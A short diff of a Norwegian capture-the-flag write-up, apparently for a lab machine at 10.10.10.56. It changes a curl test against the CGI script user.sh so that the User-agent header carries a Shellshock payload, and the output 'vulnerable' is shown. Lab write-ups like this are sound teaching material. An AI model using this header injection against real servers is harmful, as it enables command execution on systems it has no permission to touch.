@@ -36,7 +36,7 @@ Vi finner kjapt: <b>user.sh</b>.
 Vi kjører en test:
 
 ```
-curl -H "User-agent: myuseragent" http://10.10.10.56/cgi-bin/user.sh
+curl -H "User-agent: () { :;}; echo; echo vulnerable" http://10.10.10.56/cgi-bin/user.sh
 
 vulnerable
 
